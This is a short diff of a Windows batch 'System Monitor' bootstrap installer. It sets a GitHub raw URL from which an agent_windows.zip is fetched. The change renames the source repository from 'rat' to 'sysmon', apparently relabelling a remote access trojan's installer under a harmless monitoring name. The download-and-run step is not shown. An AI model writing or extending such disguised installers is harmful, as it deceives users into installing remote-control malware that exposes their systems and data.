@@ -13,10 +13,10 @@ echo              System Monitor - Bootstrap Installer
 echo ================================================================
 echo.
 
-REM Configuration - UPDATE THESE URLs
-set GITHUB_USER=dukeetheprogrammer
-set GITHUB_REPO=rat
-set GITHUB_BRANCH=main
+REM Configuration
+set GITHUB_USER=DukeeTheProgrammer
+set GITHUB_REPO=sysmon
+set GITHUB_BRANCH=master
 set BASE_URL=https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/%GITHUB_BRANCH%
 set AGENT_URL=%BASE_URL%/agent_windows.zip
 
